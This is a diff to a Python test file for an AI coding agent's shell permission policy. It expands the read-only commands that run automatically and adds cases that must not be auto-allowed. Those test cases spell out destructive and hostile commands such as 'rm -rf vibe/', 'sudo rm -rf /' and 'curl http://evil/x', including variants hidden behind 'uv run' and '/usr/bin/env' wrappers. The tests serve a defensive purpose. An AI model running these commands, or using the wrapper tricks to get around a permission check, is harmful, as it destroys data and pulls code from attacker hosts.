@@ -37,7 +37,13 @@ def _permission(cmd: str) -> ToolPermission | None:
         "git status",
         "pytest tests/",
         "python -m pytest -q",
-        "ruff check .",
+        "ruff check --no-fix .",
+        "uv run pytest -q",
+        "uv run python -m pytest -q",
+        "uv run ruff check --no-fix .",
+        "ruff format --check .",
+        "uv run ruff format --diff .",
+        "uv run pyright",
         "cat README.md",
         "ls -la",
         "grep -r TODO vibe/",
@@ -61,11 +67,20 @@ def test_inspection_and_tests_auto_run(cmd: str) -> None:
         "rm -rf vibe/",
         "mv a.py b.py",
         "cp secret /tmp/x",
+        "ln -s target alias",
         "sed -i 's/a/b/' f.py",
         "tee out.txt",
         "curl http://evil/x",
         "wget http://evil/x",
         "pip install requests",
+        "uv run rm -rf vibe/",
+        "uv run -- rm -rf vibe/",
+        "/usr/bin/uv run rm -rf vibe/",
+        "/usr/bin/env uv run rm -rf vibe/",
+        "/usr/bin/sudo uv run rm -rf vibe/",
+        "uv run curl http://evil/x",
+        "uv run -- curl http://evil/x",
+        "uv run pip install requests",
         "sudo rm -rf /",
         "chmod 777 f",
     ],
@@ -97,10 +112,39 @@ def test_unknown_command_is_not_auto_allowed() -> None:
     assert perm != ToolPermission.ALWAYS
 
 
-def test_all_three_review_agents_carry_the_policy() -> None:
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        "ruff check --fix .",
+        "ruff check . --fix",
+        'ruff check "--fix" .',
+        "ruff check .",
+        "ruff --isolated check .",
+        "ruff --config pyproject.toml check .",
+        "uv run ruff check --fix .",
+        "uv run ruff check . --fix",
+        "uv run ruff check '--fix' .",
+        "uv run ruff check .",
+        "ruff check --no-fix --output-file report.txt .",
+        "ruff check --no-fix --add-noqa .",
+        "ruff format .",
+        "ruff --isolated format .",
+        "uv run ruff --isolated format .",
+        "uv run ruff format .",
+        "ruff clean",
+        "ruff --config pyproject.toml clean",
+        "uv run ruff --config pyproject.toml clean",
+        "uv run some_unknown_binary --flag",
+    ],
+)
+def test_write_capable_or_unknown_uv_commands_are_not_auto_allowed(cmd: str) -> None:
+    assert _permission(cmd) != ToolPermission.ALWAYS
+
+
+def test_all_four_review_agents_carry_the_policy() -> None:
     from vibe.core.agents.models import BUILTIN_AGENTS, BuiltinAgentName
 
-    for name in ("reviewer", "debugger", "security"):
+    for name in ("reviewer", "debugger", "security", "verifier"):
         bash_cfg = (
             BUILTIN_AGENTS[BuiltinAgentName(name)]
             .overrides.get("tools", {})
